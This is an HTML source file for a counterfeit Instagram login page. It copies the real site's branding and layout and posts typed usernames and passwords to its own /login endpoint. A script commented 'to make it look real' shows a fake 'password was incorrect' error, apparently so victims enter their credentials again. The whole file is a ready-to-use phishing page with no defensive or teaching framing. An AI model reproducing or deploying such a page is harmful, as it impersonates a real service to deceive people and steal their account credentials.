<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 350px;
            width: 100%;
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px;
            text-align: center;
        }
        .logo {
            font-family: 'Billabong', cursive;
            font-size: 48px;
            margin-bottom: 30px;
            color: #262626;
        }
        .logo span { font-family: 'Billabong', cursive; }
        input {
            width: 100%;
            padding: 12px 8px;
            margin-bottom: 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            outline: none;
        }
        input:focus { border-color: #a8a8a8; }
        button {
            width: 100%;
            padding: 10px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover { background: #1877f2; }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider::before { margin-right: 18px; }
        .divider::after { margin-left: 18px; }
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin: 10px 0;
        }
        .signup {
            margin-top: 20px;
            font-size: 14px;
            color: #262626;
        }
        .signup a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        .error-msg {
            color: #ed4956;
            font-size: 14px;
            margin-bottom: 10px;
            display: none;
        }
        .forgot { font-size: 12px; color: #00376b; margin-top: 15px; display: block; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form id="loginForm" action="/login" method="POST">
            <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
            <input type="text" name="username" placeholder="Phone number, username, or email" required autofocus>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="divider">OR</div>
        <a href="#" class="fb-login">Log in with Facebook</a>
        <a href="#" class="forgot">Forgot password?</a>
        <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
    </div>
    <script>
        // Simulate Instagram error to make it look real
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            // Just let it submit; the server will redirect back with error
        });
        // If the URL has ?error=1, show error message
        if (window.location.search.includes('error=1')) {
            document.getElementById('errorMsg').style.display = 'block';
        }
    </script>
</body>
</html>
